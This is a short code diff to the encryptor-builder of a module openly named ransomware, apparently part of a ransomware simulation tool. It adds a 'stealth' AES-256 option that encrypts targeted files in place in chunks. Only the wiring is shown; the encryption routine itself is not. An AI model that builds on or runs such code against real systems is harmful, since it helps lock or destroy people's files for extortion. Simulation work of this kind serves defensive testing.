@@ -11,6 +11,7 @@ from .file_selectors import ProductionSafeTargetFileSelector, RecursiveTargetFil
 from .in_place_file_encryptor import InPlaceFileEncryptor
 from .ransomware import Ransomware
 from .ransomware_options import EncryptionAlgorithm, RansomwareOptions
+from .stealth_aes_256_bit_manipulator import StealthAES256BitManipulator
 from .targeted_file_extensions import TARGETED_FILE_EXTENSIONS
 
 CHUNK_SIZE = 4096 * 24
@@ -44,6 +45,12 @@ def _build_file_encryptor(ransomware_options: RansomwareOptions):
         )
     elif ransomware_options.algorithm == EncryptionAlgorithm.AES256:
         return AES256FileEncryptor(PASSWORD, file_extension)
+    elif ransomware_options.algorithm == EncryptionAlgorithm.STEALTH_AES256:
+        return InPlaceFileEncryptor(
+            encrypt_bytes=StealthAES256BitManipulator(),
+            new_file_extension=file_extension,
+            chunk_size=CHUNK_SIZE,
+        )
 
     raise ValueError(
         "An unsupported encryption algorithm was specified: " f"{str(ransomware_options.algorithm)}"
